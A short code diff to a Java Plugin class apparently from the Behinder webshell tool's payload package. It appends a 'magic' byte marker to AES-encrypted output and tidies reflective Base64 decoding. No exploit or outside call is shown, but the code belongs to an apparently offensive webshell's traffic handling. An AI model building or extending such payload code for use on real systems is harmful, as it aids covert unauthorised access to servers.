@@ -1,5 +1,6 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
@@ -195,7 +196,10 @@ public class Plugin implements Runnable {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      bos.write(this.getMagic());
+      return bos.toByteArray();
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -305,12 +309,12 @@ public class Plugin implements Runnable {
          this.getClass();
          Base64 = Class.forName("java.util.Base64");
          Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
+         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
       } else {
          this.getClass();
          Base64 = Class.forName("sun.misc.BASE64Decoder");
          Decoder = Base64.newInstance();
-         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
+         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
       }
 
       return result;
